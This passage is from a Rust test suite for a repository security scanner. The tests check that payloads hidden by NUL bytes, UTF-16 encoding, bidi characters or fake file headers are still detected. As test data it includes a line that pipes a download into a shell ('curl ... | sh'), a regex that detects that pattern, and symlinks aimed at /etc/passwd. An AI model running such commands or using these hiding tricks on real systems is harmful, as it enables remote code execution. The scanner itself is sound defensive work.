        description = "Matches TODO anywhere"
        example = "a.txt:1"
        pattern = 'TODO'

        [[rule]]
        id = "test.only-json"
        engine = "line-regex"
        family = "test"
        stage = "ide"
        severity = "high"
        description = "Matches TODO in JSON under .vscode"
        example = ".vscode/tasks.json:1"
        pattern = 'TODO'
        files = [".vscode/*.json"]
    "#;

    fn write(root: &Path, relative: &str, contents: &[u8]) {
        let path = root.join(relative);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, contents).unwrap();
    }

    /// A file-level rule that reports what the engine handed to its check.
    fn probe(ctx: &Ctx<'_>) -> Vec<Hit> {
        vec![Hit {
            line: 1,
            span: None,
            severity: ctx.base,
            reason: format!(
                "path={} bytes={} issue={:?} helper={} truncated={}",
                ctx.path,
                ctx.bytes().len(),
                ctx.issue,
                ctx.repo.has_module("helper"),
                ctx.truncated
            ),
        }]
    }

    fn file_rule(glob: &str, check: Check) -> Rule {
        let mut globs = GlobSetBuilder::new();
        globs.add(
            GlobBuilder::new(glob)
                .case_insensitive(true)
                .build()
                .unwrap(),
        );
        Rule {
            id: "test.file".to_string(),
            family: "test".to_string(),
            stage: Stage::Deps,
            severity: Severity::High,
            attack: vec![],
            description: "test".to_string(),
            example: "x".to_string(),
            matcher: Matcher::File(check),
            files: Some(globs.build().unwrap()),
            names_executables: false,
        }
    }

    fn explanations(report: &Report) -> Vec<(String, String)> {
        report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.explanation.clone()))
            .collect()
    }

    #[test]
    fn findings_have_file_line_and_rule_metadata() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.txt", b"fine\nTODO here\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.files_scanned, 1);
        assert_eq!(report.findings.len(), 1);
        let finding = &report.findings[0];
        assert_eq!(finding.rule_id, "test.everywhere");
        assert_eq!(finding.file, PathBuf::from("a.txt"));
        assert_eq!(finding.line, 2);
    }

    #[test]
    fn file_globs_limit_where_a_rule_runs() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), ".vscode/tasks.json", b"TODO\n");
        write(dir.path(), "notes.json", b"TODO\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let ids: Vec<_> = report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.rule_id.as_str()))
            .collect();
        assert_eq!(
            ids,
            [
                (".vscode/tasks.json".to_string(), "test.everywhere"),
                (".vscode/tasks.json".to_string(), "test.only-json"),
                ("notes.json".to_string(), "test.everywhere"),
            ]
        );
    }

    #[test]
    fn binary_files_are_line_scanned_as_ascii_and_listed() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "blob.bin", b"\x1f\x8b\0\0TODO");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.files_scanned, 1);
        assert_eq!(report.findings.len(), 1);
        assert!(
            report.findings[0]
                .explanation
                .ends_with("(found in a binary-looking file)")
        );
        assert_eq!(
            report.skipped,
            [Skipped {
                path: PathBuf::from("blob.bin"),
                reason: SkipReason::Binary,
            }]
        );
    }

    #[test]
    fn crlf_line_endings_count_lines_correctly() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.txt", b"one\r\ntwo\r\nTODO\r\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.findings[0].line, 3);
    }

    #[test]
    fn a_scan_that_read_everything_is_complete() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.txt", b"fine\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(report.is_complete());
        assert_eq!(report.inconclusive_count(), 0);
    }

    #[test]
    fn unread_and_executable_files_make_the_scan_incomplete() {
        let skip = |reason| Skipped {
            path: PathBuf::from("x"),
            reason,
        };
        for reason in [
            SkipReason::TooLarge { size: 9 },
            SkipReason::Unreadable {
                error: "denied".to_string(),
            },
            SkipReason::Executable {
                format: "ELF",
                reported: false,
            },
        ] {
            let report = Report {
                skipped: vec![skip(reason.clone())],
                ..Report::default()
            };
            assert!(!report.is_complete(), "{reason:?}");
            assert_eq!(report.inconclusive_count(), 1);
        }
    }

    #[test]
    fn a_binary_that_was_read_but_has_no_rules_does_not_make_the_scan_incomplete() {
        let report = Report {
            skipped: vec![Skipped {
                path: PathBuf::from("data.gz"),
                reason: SkipReason::Binary,
            }],
            ..Report::default()
        };

        assert!(report.is_complete());
        assert_eq!(report.inconclusive_count(), 0);
    }

    #[test]
    fn an_mz_header_is_a_pe_only_with_its_signature() {
        let mut pe = vec![0u8; 0x48];
        pe[..2].copy_from_slice(b"MZ");
        pe[0x3C] = 0x40;
        pe[0x40..0x44].copy_from_slice(b"PE\0\0");
        assert_eq!(executable_format(&pe), Some("PE"));
        pe[0x40..0x44].copy_from_slice(b"text");
        assert_eq!(
            executable_format(&pe),
            None,
            "MZ data without a PE signature"
        );
        // When the bytes cannot tell, it still counts.
        assert_eq!(
            executable_format(b"MZ\x90\0\x03\0"),
            Some("PE"),
            "too short"
        );
        let mut far = vec![0u8; 0x48];
        far[..2].copy_from_slice(b"MZ");
        far[0x3C..0x40].copy_from_slice(&0xFFFF_FF00u32.to_le_bytes());
        assert_eq!(
            executable_format(&far),
            Some("PE"),
            "signature past the bytes"
        );
    }

    #[test]
    fn executable_formats_are_recognised_by_their_magic_bytes() {
        let cases: [(&[u8], Option<&str>); 12] = [
            (b"\x7fELF\x02\x01\x01\0", Some("ELF")),
            (b"MZ\x90\0\x03\0", Some("PE")),
            (&[0xFE, 0xED, 0xFA, 0xCE, 0, 0], Some("Mach-O")),
            (&[0xFE, 0xED, 0xFA, 0xCF, 0, 0], Some("Mach-O")),
            (&[0xCE, 0xFA, 0xED, 0xFE, 0, 0], Some("Mach-O")),
            (&[0xCF, 0xFA, 0xED, 0xFE, 0, 0], Some("Mach-O")),
            (
                &[0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 2],
                Some("Mach-O fat (or Java class)"),
            ),
            (
                &[0xCA, 0xFE, 0xBA, 0xBF, 0, 0, 0, 2],
                Some("Mach-O fat (or Java class)"),
            ),
            (&[0x1F, 0x8B, 8, 0, 0], None),
            (&[0x28, 0xB5, 0x2F, 0xFD, 0], None),
            (b"\x89PNG\r\n\x1a\n\0", None),
            (b"", None),
        ];
        for (bytes, expected) in cases {
            assert_eq!(executable_format(bytes), expected, "{bytes:?}");
        }
    }

    #[test]
    fn an_executable_that_a_file_rule_examined_is_still_listed() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "helper.start", b"\x7fELF\x02\x01\x01\0\0\0\0\0");
        let rules = vec![file_rule("*.start", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.findings.len(), 1);
        assert_eq!(report.inconclusive_count(), 1);
        assert!(!report.is_complete());
    }

    #[test]
    fn an_elf_binary_is_listed_as_an_executable_and_a_gzip_file_as_plain_binary() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "tool", b"\x7fELF\x02\x01\x01\0\0\0\0\0");
        write(dir.path(), "data.gz", &[0x1F, 0x8B, 8, 0, 0, 0, 0, 0]);
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let reasons: Vec<_> = report
            .skipped
            .iter()
            .map(|s| (to_slash(&s.path), s.reason.clone()))
            .collect();
        assert_eq!(
            reasons,
            [
                ("data.gz".to_string(), SkipReason::Binary),
                (
                    "tool".to_string(),
                    SkipReason::Executable {
                        format: "ELF",
                        reported: false,
                    }
                ),
            ]
        );
        assert!(
            !report.is_complete(),
            "the executable makes it inconclusive"
        );
        assert_eq!(report.inconclusive_count(), 1);
    }

    #[test]
    fn a_symlink_alone_does_not_make_the_scan_incomplete() {
        let report = Report {
            skipped: vec![Skipped {
                path: PathBuf::from("link"),
                reason: SkipReason::Symlink { target: None },
            }],
            ..Report::default()
        };

        assert!(report.is_complete());
    }

    #[test]
    fn a_payload_past_the_file_limit_is_missed_and_the_scan_is_not_complete() {
        let dir = tempfile::tempdir().unwrap();
        // Padding sorts before the payload, so the limit cuts the payload off.
        for name in ["a1.txt", "a2.txt", "a3.txt", "a4.txt"] {
            write(dir.path(), name, b"padding\n");
        }
        write(dir.path(), "z-payload.txt", b"TODO payload\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();
        let limits = Limits {
            max_files: 4,
            ..Limits::default()
        };

        let report = scan(dir.path(), &rules, limits);

        assert!(report.findings.is_empty(), "the payload was never read");
        assert!(report.truncated);
        assert!(
            !report.is_complete(),
            "no findings must not mean clean here"
        );
    }

    #[test]
    fn file_rules_see_raw_bytes_of_binary_looking_files() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "x.pth", b"# \0 comment\nimport os\n");
        write(dir.path(), "other.bin", b"\x1f\x8b\0\0");
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        let found = explanations(&report);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].0, "x.pth");
        assert!(found[0].1.contains("bytes=22 issue=None"), "{}", found[0].1);
        // The text file a rule examined is not listed; the binary one is
        // read as ASCII by the line rules and listed.
        assert_eq!(report.files_scanned, 2);
        assert_eq!(
            report.skipped,
            [Skipped {
                path: PathBuf::from("other.bin"),
                reason: SkipReason::Binary,
            }]
        );
    }

    #[test]
    fn file_rules_only_run_on_files_their_globs_select() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.pth", b"x");
        write(dir.path(), "a.txt", b"x");
        write(dir.path(), "UPPER.PTH", b"x");
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        let files: Vec<_> = explanations(&report)
            .into_iter()
            .map(|(file, _)| file)
            .collect();
        assert_eq!(files, ["UPPER.PTH", "a.pth"]);
    }

    #[test]
    fn oversized_files_reach_file_rules_with_an_issue_and_stay_in_skipped() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "big.pth", &[b'#'; 100]);
        let limits = Limits {
            max_file_size: 10,
            ..Limits::default()
        };
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, limits);

        let found = explanations(&report);
        assert_eq!(found.len(), 1);
        assert!(
            found[0]
                .1
                .contains("bytes=0 issue=Some(TooLarge { size: 100 })"),
            "{}",
            found[0].1
        );
        assert_eq!(report.skipped.len(), 1);
        assert!(matches!(
            report.skipped[0].reason,
            SkipReason::TooLarge { size: 100 }
        ));
    }

    #[cfg(unix)]
    #[test]
    fn symlinks_reach_file_rules_with_the_target_content_when_it_is_inside() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "docs/notes.txt", b"12345");
        std::os::unix::fs::symlink("docs/notes.txt", dir.path().join("inside.pth")).unwrap();
        std::os::unix::fs::symlink("../../etc/passwd", dir.path().join("outside.pth")).unwrap();
        std::os::unix::fs::symlink("/etc/passwd", dir.path().join("absolute.pth")).unwrap();
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        let found = explanations(&report);
        let get = |name: &str| {
            found
                .iter()
                .find(|(file, _)| file == name)
                .unwrap()
                .1
                .clone()
        };
        assert!(
            get("inside.pth").contains("bytes=5 issue=Some(Symlink"),
            "{}",
            get("inside.pth")
        );
        assert!(get("outside.pth").contains("bytes=0 issue=Some(Symlink"));
        assert!(get("absolute.pth").contains("bytes=0 issue=Some(Symlink"));
        // All three are still listed as not followed.
        assert_eq!(
            report
                .skipped
                .iter()
                .filter(|s| matches!(s.reason, SkipReason::Symlink { .. }))
                .count(),
            3
        );
    }

    /// A recorded link must not hide a regular file whose name differs only in
    /// bytes that are not UTF-8: names are compared exactly, never lossily.
    /// Not on macOS, where the file system refuses names that are not UTF-8.
    #[cfg(all(unix, not(target_os = "macos")))]
    #[test]
    fn a_recorded_link_does_not_hide_a_file_whose_name_differs_in_invalid_utf8() {
        use std::ffi::OsStr;
        use std::os::unix::ffi::OsStrExt;

        let dir = tempfile::tempdir().unwrap();
        let link = PathBuf::from(OsStr::from_bytes(b"x\xfe.code-workspace"));
        let file = PathBuf::from(OsStr::from_bytes(b"x\xff.code-workspace"));
        fs::write(dir.path().join(&link), "notes.txt").unwrap();
        fs::write(
            dir.path().join(&file),
            r#"{"tasks": {"tasks": [{"label": "x", "runOptions": {"runOn": "folderOpen"}}]}}"#,
        )
        .unwrap();
        let links = HashSet::from([link.clone()]);

        let report = scan_with_links(
            dir.path(),
            &builtin_rules().unwrap(),
            Limits::default(),
            &links,
        );

        let autorun: Vec<&PathBuf> = report
            .findings
            .iter()
            .filter(|f| f.explanation.contains("runs automatically"))
            .map(|f| &f.file)
            .collect();
        assert_eq!(autorun, [&file]);
        let listed_links: Vec<&PathBuf> = report
            .skipped
            .iter()
            .filter(|s| matches!(s.reason, SkipReason::Symlink { .. }))
            .map(|s| &s.path)
            .collect();
        assert_eq!(listed_links, [&link]);
    }

    #[test]
    fn a_recorded_link_gets_a_name_finding_once() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "x.bat", b"@echo off\n");
        write(dir.path(), "tools/run.bat", b"../x.bat");
        let links = HashSet::from([PathBuf::from("tools/run.bat")]);

        let report = scan_with_links(
            dir.path(),
            &builtin_rules().unwrap(),
            Limits::default(),
            &links,
        );

        let on_link: Vec<(String, String)> = report
            .findings
            .iter()
            .filter(|f| f.file == Path::new("tools/run.bat"))
            .map(|f| (f.rule_id.clone(), f.explanation.clone()))
            .collect();
        let mut unique = on_link.clone();
        unique.dedup();
        assert_eq!(on_link, unique);
        assert!(!on_link.is_empty());
    }

    #[test]
    fn file_rules_can_ask_whether_a_module_is_in_the_repository() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.pth", b"x");
        write(dir.path(), "lib/helper.py", b"x");
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(explanations(&report)[0].1.contains("helper=true"));
    }

    #[test]
    fn file_rules_are_told_when_the_walk_was_cut_short() {
        let dir = tempfile::tempdir().unwrap();
        for name in ["a.pth", "b.txt", "c.txt"] {
            write(dir.path(), name, b"x");
        }
        let limits = Limits {
            max_files: 2,
            ..Limits::default()
        };
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, limits);

        assert!(report.truncated);
        assert!(explanations(&report)[0].1.contains("truncated=true"));
    }

    #[test]
    fn jsonc_checks_see_the_repository_index_and_the_decoded_text() {
        fn probe_jsonc(ctx: &Ctx<'_>) -> Vec<Hit> {
            vec![Hit {
                line: 1,
                span: None,
                severity: ctx.base,
                reason: format!(
                    "path={} helper={} truncated={} parsed={} text={:?}",
                    ctx.path,
                    ctx.repo.has_module("helper"),
                    ctx.truncated,
                    ctx.jsonc().is_ok(),
                    ctx.text().trim_end(),
                ),
            }]
        }
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "helper.py", b"");
        // A jsonc check now gets the repository index like a file check does.
        write(dir.path(), "a.json", b"{\"k\": 1}\n");
        let mut rule = file_rule("**/*.json", probe_jsonc);
        rule.matcher = Matcher::Jsonc(probe_jsonc);

        let report = scan(dir.path(), &[rule], Limits::default());

        assert_eq!(
            explanations(&report),
            [(
                "a.json".to_string(),
                r#"path=a.json helper=true truncated=false parsed=true text="{\"k\": 1}""#
                    .to_string()
            )]
        );
    }

    #[test]
    fn file_rule_explanations_are_cleaned_and_long_lists_are_capped() {
        fn noisy(_: &Ctx<'_>) -> Vec<Hit> {
            (1..=150)
                .map(|line| Hit {
                    line,
                    span: None,
                    severity: Severity::High,
                    reason: "bad \u{1b}[2J text".to_string(),
                })
                .collect()
        }
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.pth", b"x");
        let rules = [file_rule("**/*.pth", noisy)];

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.findings.len(), MAX_FINDINGS_PER_FILE_CHECK);
        assert!(
            report
                .findings
                .iter()
                .all(|f| !f.explanation.contains('\u{1b}'))
        );
        let last = report.findings.last().unwrap();
        assert!(last.explanation.contains("50 more"), "{}", last.explanation);
    }

    // ---- scripts with NUL bytes -------------------------------------------

    use crate::rule::builtin_rules;

    const NUL_RULE: &str = "deception.nul-byte-in-script";
    const BIDI: &str = "\u{202e}";

    fn builtin_findings(report: &Report, rule_id: &str) -> Vec<(String, usize)> {
        report
            .findings
            .iter()
            .filter(|f| f.rule_id == rule_id)
            .map(|f| (to_slash(&f.file), f.line))
            .collect()
    }

    #[test]
    fn a_shell_script_with_a_nul_in_a_comment_still_reaches_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        // The NUL is on line 1; a Trojan Source character sits on line 2.
        write(
            dir.path(),
            "install.sh",
            format!("# a\0b\necho {BIDI}\n").as_bytes(),
        );
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("install.sh".to_string(), 1)]
        );
        assert_eq!(
            builtin_findings(&report, "deception.bidi-control"),
            [("install.sh".to_string(), 2)],
            "the line rules must see what follows the NUL byte"
        );
        assert!(report.skipped.is_empty(), "{:?}", report.skipped);
        assert!(report.is_complete());
        assert_eq!(report.files_scanned, 1);
    }

    #[test]
    fn a_file_with_a_shebang_and_no_extension_is_a_script() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "configure", b"#!/bin/sh\n# x\0y\n");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("configure".to_string(), 2)]
        );
        assert!(report.skipped.is_empty());
    }

    #[test]
    fn a_nul_byte_far_from_the_start_of_a_script_is_still_reported() {
        let dir = tempfile::tempdir().unwrap();
        // Past the 8 KiB window used to sniff for binaries.
        let content = format!("{}\0\n", "echo hi\n".repeat(5000));
        write(dir.path(), "late.sh", content.as_bytes());
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("late.sh".to_string(), 5001)]
        );
    }

    #[test]
    fn extensions_are_matched_without_regard_to_case() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "RUN.SH", b"# a\0b\n");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("RUN.SH".to_string(), 1)]
        );
    }

    #[test]
    fn files_with_a_known_binary_header_stay_binary() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "image.png", b"\x89PNG\0\0");
        write(dir.path(), "data.gz", &[0x1F, 0x8B, 8, 0, 0]);
        write(dir.path(), "module.wasm", b"\0asm\x01\0\0\0");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(builtin_findings(&report, NUL_RULE).is_empty());
        assert_eq!(report.skipped.len(), 3);
        assert!(
            report
                .skipped
                .iter()
                .all(|s| s.reason == SkipReason::Binary)
        );
        // Read, listed, and no rules for the format: that does not make the
        // scan inconclusive (an executable binary would).
        assert!(report.is_complete());
    }

    #[test]
    fn a_utf16_script_is_decoded_and_read_by_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        let utf16 = |text: &str, le: bool| {
            let mut bytes = if le {
                vec![0xFF, 0xFE]
            } else {
                vec![0xFE, 0xFF]
            };
            for unit in text.encode_utf16() {
                bytes.extend(if le {
                    unit.to_le_bytes()
                } else {
                    unit.to_be_bytes()
                });
            }
            bytes
        };
        write(dir.path(), "legit.ps1", &utf16("Write-Host", true));
        write(
            dir.path(),
            "bidi.ps1",
            &utf16("# a\n# \u{202E}evil\n", true),
        );
        write(dir.path(), "bidi-be.vbs", &utf16("' \u{202E}evil\n", false));
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(builtin_findings(&report, NUL_RULE).is_empty());
        assert!(report.skipped.is_empty());
        let bidi: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "deception.bidi-control")
            .map(|f| (to_slash(&f.file), f.line))
            .collect();
        assert_eq!(
            bidi,
            [("bidi-be.vbs".to_string(), 1), ("bidi.ps1".to_string(), 2)]
        );
    }

    #[test]
    fn a_file_with_a_nul_and_no_known_header_still_reaches_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        // Sourced by install.sh; dash drops the NUL and runs the rest.
        write(dir.path(), "lib/common", b"# x\n\0\n# \xE2\x80\xAEevil\n");
        write(dir.path(), ".envrc", b"a\0\n# \xE2\x80\xAEevil\n");
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let lines: Vec<_> = report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.line))
            .collect();
        assert_eq!(
            lines,
            [(".envrc".to_string(), 2), ("lib/common".to_string(), 3)]
        );
        assert!(report.skipped.is_empty());
    }

    /// Bytes that are not valid UTF-8 (0xFF never is) around a sequence the
    /// bidi rule would match, with a few NULs, like the middle of an icon or
    /// an audio stream.
    fn noise_with_bidi(header: &[u8]) -> Vec<u8> {
        let mut bytes = header.to_vec();
        for i in 0..400u32 {
            bytes.push((i.wrapping_mul(37) % 251) as u8 | 0x80);
        }
        bytes.extend_from_slice(&[0xFF, 0xE2, 0x80, 0xAE, 0xFF]);
        bytes.extend_from_slice(&[0x11; 200]);
        bytes
    }

    #[test]
    fn binary_data_without_a_known_header_gets_no_findings_from_non_ascii_rules() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "icon.icns", &noise_with_bidi(b"icns\0\0\x10\0"));
        write(
            dir.path(),
            "voice.mp3",
            &noise_with_bidi(b"ID3\x03\0\0\0\0\x0a\0"),
        );
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(report.findings.is_empty(), "{:?}", report.findings);
        assert!(report.is_complete());
    }

    #[test]
    fn a_script_is_read_even_when_the_rest_of_it_is_binary() {
        // Scripts keep the rule that a NUL does not make them binary: the
        // zipapp pattern (see the NUL rule) and the NUL itself are reported.
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "tool.sh",
            &noise_with_bidi(b"#!/bin/sh\n# a\0b\n"),
        );
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, NUL_RULE),
            [("tool.sh".to_string(), 2)]
        );
        assert!(report.skipped.is_empty());
    }

    const CURL_SH: &str = r#"
        [[rule]]
        id = "test.curl-sh"
        engine = "line-regex"
        family = "test"
        stage = "run"
        severity = "high"
        description = "Pipes a download into a shell"
        example = "lib/env:1"
        pattern = 'curl .*\| *sh'
    "#;

    const PAYLOAD: &[u8] = b"curl https://example.invalid/x | sh\n";

    fn payload_with(prefix: &[u8], suffix: &[u8]) -> Vec<u8> {
        [prefix, PAYLOAD, suffix].concat()
    }

    /// Scans one extensionless file (a shell can `source` it) with the
    /// builtin rules and the curl rule, and returns the report.
    fn scan_sourced(contents: &[u8]) -> Report {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "lib/env", contents);
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());
        scan(dir.path(), &rules, Limits::default())
    }

    fn assert_payload_found_on_line(report: &Report, line: usize) {
        let found: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "test.curl-sh")
            .collect();
        assert_eq!(found.len(), 1, "{:?}", report.findings);
        assert_eq!(found[0].line, line);
        assert!(
            report
                .skipped
                .iter()
                .all(|s| s.reason == SkipReason::Binary)
        );
        assert!(report.is_complete());
    }

    #[test]
    fn one_nul_and_one_invalid_byte_do_not_hide_a_sourced_payload() {
        let report = scan_sourced(&payload_with(b"", b"# \0\xFF\n"));

        assert_payload_found_on_line(&report, 1);
        assert!(
            report.findings[0]
                .explanation
                .ends_with("(found in a binary-looking file)"),
            "{}",
            report.findings[0].explanation
        );
    }

    #[test]
    fn a_nul_past_the_sniffed_prefix_does_not_hide_a_payload() {
        let comments = "# a comment line\n".repeat(600);
        assert!(comments.len() > BINARY_SNIFF_LEN);
        let report = scan_sourced(&payload_with(comments.as_bytes(), b"# \0\xFF\n"));

        assert_payload_found_on_line(&report, 601);
    }

    #[test]
    fn nul_padding_after_a_payload_does_not_hide_it() {
        let report = scan_sourced(&payload_with(b"", &[0; 4096]));

        assert_payload_found_on_line(&report, 1);
    }

    #[test]
    fn nul_between_every_byte_does_not_hide_a_payload() {
        // ASCII in UTF-16 without a byte order mark: one NUL per byte.
        let wide: Vec<u8> = PAYLOAD.iter().flat_map(|&b| [b, 0]).collect();
        let report = scan_sourced(&wide);

        assert_payload_found_on_line(&report, 1);
    }

    #[test]
    fn a_latin_1_byte_with_a_nul_does_not_hide_a_payload() {
        let report = scan_sourced(&payload_with(b"", b"# caf\xE9 \0\n"));

        assert_payload_found_on_line(&report, 1);
    }

    #[test]
    fn text_with_a_stray_nul_is_not_marked_binary_looking() {
        let report = scan_sourced(&payload_with(b"# a stray \0 in plain text\n", b""));

        assert_payload_found_on_line(&report, 2);
        assert!(!report.findings[0].explanation.contains("binary-looking"));
        assert!(report.skipped.is_empty());
    }

    #[test]
    fn a_known_header_does_not_hide_a_sourced_payload() {
        // `GIF89a=1` is a valid shell assignment; the rest of the file runs.
        for header in [&b"GIF89a=1\n"[..], b"%PDF-1.4\n", b"PK\x03\x04\n"] {
            let report = scan_sourced(&payload_with(header, b"\0\n"));

            assert_payload_found_on_line(&report, 2);
            assert!(
                report.findings[0]
                    .explanation
                    .ends_with("(found in a binary-looking file)")
            );
            assert!(report.is_complete());
        }
    }

    #[test]
    fn real_binary_formats_give_no_findings() {
        let dir = tempfile::tempdir().unwrap();
        let formats: [(&str, &[u8]); 5] = [
            ("a.png", b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR"),
            ("b.zip", b"PK\x03\x04\x14\0\0\0\x08\0"),
            ("c.gz", &[0x1F, 0x8B, 8, 0, 0, 0, 0, 0]),
            ("d.icns", b"icns\0\0\x10\0"),
            ("e.mp3", b"ID3\x03\0\0\0\0\x0a\0"),
        ];
        for (name, header) in formats {
            write(dir.path(), name, &noise_with_bidi(header));
        }
        let mut rules = builtin_rules().unwrap();
        rules.extend(parse_rules(CURL_SH, "test.toml").unwrap());

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(report.findings.is_empty(), "{:?}", report.findings);
        assert_eq!(report.skipped.len(), 5);
        assert!(report.is_complete());
    }

    #[test]
    fn a_flood_of_low_findings_cannot_hide_a_critical_one() {
        const DECOY_AND_PAYLOAD: &str = r#"
            [[rule]]
            id = "test.decoy"
            engine = "line-regex"
            family = "test"
            stage = "run"
            severity = "low"
            description = "Decoy"
            example = "a:1"
            pattern = 'DECOY'

            [[rule]]
            id = "test.payload"
            engine = "line-regex"
            family = "test"
            stage = "run"
            severity = "critical"
            description = "Payload"
            example = "a:1"
            pattern = 'PAYLOAD'
        "#;
        let dir = tempfile::tempdir().unwrap();
        let mut contents = "DECOY\n".repeat(150);
        contents.push_str("PAYLOAD\n");
        write(dir.path(), "x.txt", contents.as_bytes());
        let rules = parse_rules(DECOY_AND_PAYLOAD, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let critical: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.severity == Severity::Critical)
            .map(|f| f.line)
            .collect();
        assert_eq!(critical, [151]);
        assert_eq!(
            report.unlisted,
            [Unlisted {
                file: PathBuf::from("x.txt"),
                rule_id: "test.decoy".to_string(),
                severity: Severity::Low,
                count: 50,
            }]
        );
    }

    #[test]
    fn a_character_cut_by_a_nul_is_whole_for_the_line_rules() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "notes",
            b"some notes x \xE2\0\x80\xAE y and more text\n",
        );
        let rules = builtin_rules().unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(
            builtin_findings(&report, "deception.bidi-control"),
            [("notes".to_string(), 1)]
        );
    }

    #[test]
    fn a_line_rule_lists_a_limited_number_of_findings_per_file_and_counts_the_rest() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "todo.txt", "TODO\n".repeat(130).as_bytes());
        write(dir.path(), "few.txt", "TODO\n".repeat(3).as_bytes());
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let in_file = |name: &str| {
            report
                .findings
                .iter()
                .filter(|f| to_slash(&f.file) == name)
                .count()
        };
        assert_eq!(in_file("todo.txt"), MAX_LINE_FINDINGS_PER_RULE);
        assert_eq!(in_file("few.txt"), 3);
        assert_eq!(
            report.unlisted,
            [Unlisted {
                file: PathBuf::from("todo.txt"),
                rule_id: "test.everywhere".to_string(),
                severity: Severity::Low,
                count: 30,
            }]
        );
    }

    #[test]
    fn nul_ratio_and_utf8_checks() {
        assert!(nul_file_is_text(b"a stray \0 in some text"));
        assert!(nul_file_is_text("h\0\u{e9}llo \u{202e} world\n".as_bytes()));
        // A multi-byte character split by a NUL is whole again once it is gone.
        assert!(nul_file_is_text(
            b"some text \xE2\0\x80\xAE here and there\0"
        ));
        assert!(!nul_file_is_text(b"some text \0 and \xFF"));
        assert!(!nul_file_is_text(b"some text \0 and \xE2\x80"), "cut-off");
        assert!(!nul_file_is_text(&[0; 64]));
        // The limit is one NUL in eight bytes.
        assert!(nul_file_is_text(b"abcdefg\0"));
        assert!(!nul_file_is_text(b"abcdef\0\0"));

